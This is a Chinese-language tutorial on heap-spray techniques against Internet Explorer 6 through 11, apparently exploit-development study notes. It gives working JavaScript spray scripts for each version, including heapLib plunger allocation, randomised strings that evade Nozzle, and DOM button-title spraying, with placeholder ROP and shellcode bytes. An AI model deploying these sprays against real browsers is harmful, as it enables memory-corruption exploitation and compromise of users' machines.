# Win32+IE HeapSpray技术

# 参考
- https://www.anquanke.com/post/id/85782
- https://www.anquanke.com/post/id/87048
- https://www.blackhat.com/presentations/bh-europe-07/Sotirov/Whitepaper/bh-eu-07-sotirov-WP.pdf


# What is HeapSpray? Why 0x0c0c0c0c?

![](HeapSpray/HeapSpray1.png)
![](HeapSpray/HeapSpray2.png)

```
004010A0  0C 0C   OR AL,0C
004010A2  0C 0C   OR AL,0C

另一方面，0c0c同时也能像9090一样作为滑板指令
```


# IE6, IE7
```
<html>
<script>
    var shellcode = unescape('%u4141%u4141');
    var bigblock = unescape('%u9090%u9090');
    var headsize = 20;
    var slackspace = headsize + shellcode.length;
    while (bigblock.length < slackspace) bigblock += bigblock;
    var fillblock = bigblock.substring(0, slackspace);
    var block = bigblock.substring(0, bigblock.length - slackspace);
    while (block.length + slackspace < 0x40000) block = block + block + fillblock;
    var memory = new Array();
    for (i = 0; i < 500; i++) {memory[i] = block + shellcode;}
</script>
</html>
```

0x0C0C0C0C = 202116108个字节

500 * 0x40000 = 262144000 字节

堆喷射一定可以到达0x0C0C0C0C

![](HeapSpray/HeapSpray0.png)

# IE8

IE8在堆喷射方面没有加强，但默认开启了ALSR+DEP防护，因此必须做到精准喷射，写入0x0c0c0c0c处的内容必须刚好是ROP链的起始位置，这里用到了Heaplib， 它是一个方便进行精准堆喷射的库。

尽管IE上String是从系统堆中申请的，但并不是每次申请、释放都会直接使用系统堆
![](HeapSpray/HeapSpray3.png)

String的分配是释放是由OLEAUT32.dll中的APP_DATA类管理的，其中维护了一张缓存表。当有一块内存释放，先记录到缓存表中；当申请内存是，如果缓存表中有合适的内存，则优先分配这块内存给程序。如果从缓存表分配内存，这块内存就可能在任意地方,这并非是我们期望的。

![](HeapSpray/HeapSpray5.png)

Alexander Sotirov提出了plunger技术，在堆喷射前强制申请4*6块最大堆块内存，保证缓存表是空的，从而之后的分配都会从系统堆分配。

```
<html>
<script language='javascript' src="heapLib.js"> </script>

<script language='javascript'>
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%ucccc%ucccc");
    var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    var padding = unescape("%u9090%u9090");
    while (padding.length < 0x1000) padding += padding; // create big block of nops
    offset_length = 0x5F6;
    junk_offset = padding.substring(0, offset_length);
    var shellcode = junk_offset + rop + code + padding.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(2, 0x40000 - 0x21);
    for (var i=0; i < 500; i++) {
        heap_obj.alloc(block);
    }
    document.write("Spray done");
</script>
</html>
```

![](HeapSpray/HeapSpray4.png)


# IE9(window7)

IE9使用了Nozzle的防御措施，之前重复申请相同的字符串，在这边会分配失败。由于能精准将ROP喷射到0x0c0c0c0c，所以前后的滑板指令其实没有用处，可以用随机字符串代替。

```
<html>
<script language='javascript' src="heapLib.js"> </script>

<script language='javascript'>
    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("%ucccc%ucccc"); 
    var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    var offset_length = 0x5fe;
    for (var i=0; i < 0x800; i++) {
        var randomnumber1=Math.floor(Math.random()*90)+10;
        var randomnumber2=Math.floor(Math.random()*90)+10;
        var randomnumber3=Math.floor(Math.random()*90)+10;
        var randomnumber4=Math.floor(Math.random()*90)+10;
        var BUNSTstr = "%u" + randomnumber1.toString() + randomnumber2.toString()
        BUNSTstr += "%u" + randomnumber3.toString() + randomnumber4.toString()
        var BUNST = unescape(BUNSTstr);
        while (BUNST.length < 0x1000) BUNST+= BUNST;
        junk_offset = BUNST.substring(0, offset_length);
        var single_sprayblock = junk_offset + rop + code + BUNST.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
        heap_obj.alloc(sprayblock);
    }
    document.write("Spray done");
</script>
</html>
```

![](HeapSpray/HeapSpray6.png)

# IE10, IE11
IE10进制了喷射BSTR的操作，由此引入了创建标签来进行喷射的DEPS技术

```
并且由于内存布局的不同的原因，在IE10下0x20302228是一个稳定且便于到达的地址。
而且利用DOM喷射一个比较凑巧的优点就是不需要刻意的绕Nozzle缓解机制，其本身就不受Nozzle的影响。

```

```
<html>
<head></head>
<body>
<div id="blah"></div>
<script language="javascript">
    var div_container = document.getElementById("blah");
    div_container.style.cssText = "display:none";
    var data;
    offset = 0x104;
    junk = unescape("%u2020%u2020");
    while (junk.length < 0x1000) junk += junk;
    var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
    shellcode = unescape("%ucccc%ucccc");
    data = junk.substring(0, offset) + rop + shellcode
    data += junk.substring(0, 0x800 - offset - rop.length - shellcode.length);
    while (data.length < 0x80000) data += data;
    for (var i = 0; i < 0x500; i++)
    {
        var obj = document.createElement("button");
        obj.title = data.substring(0, 0x40000 - 0x58);
        div_container.appendChild(obj);
    }
    document.write("spray done!");
</script>
</body>
</html>
```

![](HeapSpray/HeapSpray7.png)